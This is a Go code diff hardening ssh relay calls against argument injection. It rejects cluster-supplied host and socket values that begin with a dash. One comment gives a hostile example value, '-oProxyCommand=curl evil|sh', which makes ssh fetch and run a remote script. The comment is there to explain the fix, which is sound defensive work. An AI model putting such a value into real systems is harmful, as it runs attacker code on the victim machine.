@@ -256,9 +256,22 @@ func relayTo(ctx context.Context, host, socket string) (*pipe, error) {
 	if host == "" || socket == "" {
 		return nil, errNoRelay
 	}
+	// host and socket land in ssh's argv, and both come from cluster member records — network
+	// gossip. A value beginning with '-' is parsed by ssh as an OPTION, not an argument: a vouched
+	// member publishing Host="-oProxyCommand=curl evil|sh" would make ssh run that command on THIS
+	// machine. ssh has no '--' end-of-options marker for the host, so the guard is to refuse a
+	// leading dash — the same guard git.go puts on a ref before it reaches argv.
+	if !sshSafeArg(host) || !sshSafeArg(socket) {
+		return nil, errNoRelay
+	}
 	return pipeTo(exec.CommandContext(ctx, "ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=10",
 		host, "magi", "--relay", socket))
 }
+
+// sshSafeArg rejects a value that ssh would parse as an option rather than a host/argument. The
+// socket also carries into a forced command's stream elsewhere, where a leading dash is harmless
+// data; this is for the argv path, where it is not.
+func sshSafeArg(s string) bool { return s != "" && !strings.HasPrefix(s, "-") }
 
 // doorTo opens the narrow crossing: the same ssh pipe, into `magi --fleet-door`, with the
 // companion named on the first line instead of in argv.
@@ -269,6 +282,11 @@ func relayTo(ctx context.Context, host, socket string) (*pipe, error) {
 // deployment that adds the forced command later needs no change on this side.
 func doorTo(ctx context.Context, host, socket string) (*pipe, error) {
 	if host == "" || socket == "" {
+		return nil, errNoRelay
+	}
+	// host reaches ssh's argv; a leading dash would be read as an option (see relayTo). The socket
+	// travels in the stream below, so it needs no argv guard here.
+	if !sshSafeArg(host) {
 		return nil, errNoRelay
 	}
 	p, err := pipeTo(exec.CommandContext(ctx, "ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=10",
